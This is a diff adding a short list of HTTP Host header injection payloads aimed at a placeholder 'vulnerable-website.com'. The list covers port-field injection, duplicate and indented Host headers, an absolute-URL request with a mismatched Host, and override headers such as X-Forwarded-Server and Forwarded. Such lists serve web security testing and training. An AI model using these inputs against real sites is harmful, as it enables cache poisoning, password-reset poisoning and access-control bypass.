@@ -1,0 +1,17 @@
+Host: vulnerable-website.com:bad-stuff-here
+
+Host: hacked-subdomain.vulnerable-website.com
+
+Host: vulnerable-website.com
+Host: bad-stuff-here
+
+GET https://vulnerable-website.com/ HTTP/1.1
+Host: bad-stuff-here
+
+    Host: bad-stuff-here
+Host: vulnerable-website.com
+
+X-Host
+X-Forwarded-Server
+X-HTTP-Host-Override
+Forwarded
